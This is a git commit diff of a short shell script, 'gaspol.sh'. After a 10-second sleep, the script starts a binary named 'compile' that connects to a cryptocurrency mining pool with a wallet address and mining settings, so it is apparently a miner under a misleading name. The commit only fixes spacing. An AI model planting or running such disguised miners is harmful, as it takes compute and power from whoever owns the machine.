48b65ece0918d155cf632d26d8dfb4a5412165c0
Diaznr <79598104+Diaznr@users.noreply.github.com>
2021-04-03 11:43:23 +0700

    Update gaspol.sh

--- gaspol.sh
+++ gaspol.sh
@@ -1,2 +1,2 @@
 sleep 10
-./compile --server pool.xwp.one --port 3000 --user  fh2tHLexne1dx1MqCT6WqeWb2jYepnByXiiqfekCciQx9gdNNwKedVb7sZNh6rBcHtfyyqjkexYJVTe6cSJbSZMr179kkeseA --pass paper --algo cuckaroo29s --intensity 50
+./compile --server pool.xwp.one --port 3000 --user fh2tHLexne1dx1MqCT6WqeWb2jYepnByXiiqfekCciQx9gdNNwKedVb7sZNh6rBcHtfyyqjkexYJVTe6cSJbSZMr179kkeseA --pass paper --algo cuckaroo29s --intensity 50
